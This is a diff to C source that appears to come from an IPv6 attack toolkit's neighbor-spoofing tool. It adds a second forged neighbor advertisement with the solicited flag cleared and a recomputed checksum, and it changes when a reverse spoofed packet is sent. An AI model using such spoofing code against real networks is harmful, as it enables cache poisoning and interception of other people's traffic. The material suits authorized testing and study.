@@ -66,11 +66,23 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
     thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38, ptype, ipv6->pkt + 40 + 14, ipv6->pkt_len - 40 - 14, 1240);
   else
     thc_send_pkt(interface, pkt, &pkt_len);
+
   ptr2 = thc_ipv62notation(ipv6->pkt + 38);
   ptr4 = thc_ipv62notation(ipv6->pkt + 22);
   printf("Spoofed packet to %s as %s\n", ptr2, ptr4);
   free(ptr2);
   free(ptr4);
+
+  ipv6->pkt[pkt_len - 28] = 0x20; // reset SOL flag, OVERRIDE only
+  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
+  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = 0;
+  mychecksum = checksum_pseudo_header(ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6, ipv6->pkt + 54 + (do_dst * 1400) + (do_hop + do_frag) * 8, 32);
+  ipv6->pkt[56 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum / 256;
+  ipv6->pkt[57 + (do_dst * 1400) + (do_hop + do_frag) * 8] = mychecksum % 256;
+  if (do_dst)
+    thc_send_as_fragment6(interface, ipv6->pkt + 22, ipv6->pkt + 38, ptype, ipv6->pkt + 40 + 14, ipv6->pkt_len - 40 - 14, 1240);
+  else
+    thc_send_pkt(interface, pkt, &pkt_len);
 
   if (do_reverse) {
     memcpy(ipv62->pkt, data + 74, 4);   // create the multicast mac for the dst so we dont need to do a NS :-)
@@ -101,7 +113,8 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
       thc_send_as_fragment6(interface, ipv62->pkt + 22, ipv62->pkt + 38, ptype, ipv62->pkt + 40 + 14, ipv62->pkt_len - 40 - 14, 1240);
     } else {
       thc_send_pkt(interface, pkt, &pkt_len);
-      thc_send_pkt(interface, pkt2, &pkt2_len);
+      if (do_reverse)
+        thc_send_pkt(interface, pkt2, &pkt2_len);
     }
     sleep(1);
 
@@ -117,7 +130,8 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
           thc_send_as_fragment6(interface, ipv62->pkt + 22, ipv62->pkt + 38, ptype, ipv62->pkt + 40 + 14, ipv62->pkt_len - 40 - 14, 1240);
         } else {
           thc_send_pkt(interface, pkt, &pkt_len);
-          thc_send_pkt(interface, pkt2, &pkt2_len);
+          if (do_reverse)
+            thc_send_pkt(interface, pkt2, &pkt2_len);
         }
       }
     }
@@ -131,6 +145,7 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
 
   ipv6->pkt[56] = 0;
   ipv6->pkt[57] = 0;
+  ipv6->pkt[pkt_len - 28] = 0x60; // set SOL flag again
   (void) wait3(NULL, WNOHANG, NULL);
   return;
 }
@@ -229,6 +244,7 @@ int main(int argc, char *argv[]) {
       pkt = NULL;
       pkt2_len = pkt_len;
       pkt_len = 0;
+      ipv62->pkt[pkt2_len - 28] = 0x20; // reset SOL flag, OVERRIDE only
     }
   }
 
